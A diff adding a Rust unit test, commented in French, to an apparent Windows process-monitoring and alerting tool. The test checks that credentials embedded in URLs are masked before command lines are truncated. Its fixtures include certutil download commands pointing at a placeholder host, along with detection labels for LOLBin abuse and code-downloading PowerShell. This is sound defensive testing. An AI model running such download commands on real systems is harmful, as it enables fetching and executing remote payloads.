@@ -2532,6 +2532,28 @@ fn siem_4688_ligne_de_commande_masquee() {
     assert!(e.message.contains(r"net use \\serveur\partage") && e.message.contains(r"/user:POSTE\essai"), "{}", e.message);
 }
 
+/// Prérelecture de #323 (A-6-1, défaut préexistant) : la ligne d'un processus de l'arbre est gardée bornée (1 024
+/// caractères) puis publiée bornée (300) dans les chaînes d'etat.json ; coupée avant d'être masquée, une adresse
+/// `https://admin:motdepasse@hôte` coupée avant le « @ » laissait son mot de passe. L'arbre masque la ligne entière à
+/// l'entrée (4688 et ligne complétée par une connexion), avant de la couper
+#[test]
+fn chaines_ligne_masquee_avant_de_couper() {
+    use crate::tests::{fuite_du_secret, ligne_coupee};
+    let mut arbre = arbre_de_test();
+    arbre.creation(600, Some(200), r"C:\Windows\System32\certutil.exe",
+        Some(&ligne_coupee("certutil -urlcache -f", 300, " https://admin:", "@exemple.test/f.exe s.exe")));
+    arbre.completer(400, r"C:\Windows\System32\certutil.exe", Some(&ligne_coupee("certutil -f", 300, " ftp://compte:", "@exemple.test/a")));
+    arbre.signaler(200, 5, "PowerShell obscurci ou qui télécharge du code");
+    arbre.signaler(600, 7, "détournement d'outil Windows (LOLBin)");
+    arbre.signaler(400, 7, "détournement d'outil Windows (LOLBin)");
+    let publiees = crate::moniteur::chaines_publiees(&arbre.chaines());
+    for pid in [600, 400] {
+        let n = publiees.iter().flat_map(|c| &c.noeuds).find(|n| n.pid == pid).expect("nœud publié");
+        assert!(!fuite_du_secret(&n.ligne_commande) && n.ligne_commande.starts_with("certutil") && n.ligne_commande.ends_with('…'),
+            "{pid} : {}", n.ligne_commande);
+    }
+}
+
 // ------------------------------------------------------------ VIE et BAS : vie privée, accès distant, baseline (PR 3.12)
 // Décisions surveillances::premiers_usages, surveillances::outils_distants (chemin d'un PID passé en paramètre),
 // surveillances::alerte_bureau_a_distance et baseline::derives, sans registre ni fichier de données.
